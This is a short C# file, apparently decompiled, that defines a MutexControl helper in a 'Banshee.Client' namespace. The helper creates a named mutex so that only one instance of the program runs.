﻿using System;
using System.Threading;

namespace Banshee.Client.Helper
{
	// Token: 0x0200010F RID: 271
	public static class MutexControl
	{
		// Token: 0x060003A6 RID: 934 RVA: 0x0001E3E4 File Offset: 0x0001E3E4
		public static bool CreateMutex(string mtx)
		{
			MutexControl.currentApp = new Mutex(false, mtx, ref MutexControl.createdNew);
			return MutexControl.createdNew;
		}

		// Token: 0x040002E8 RID: 744
		public static Mutex currentApp;

		// Token: 0x040002E9 RID: 745
		public static bool createdNew;
	}
}
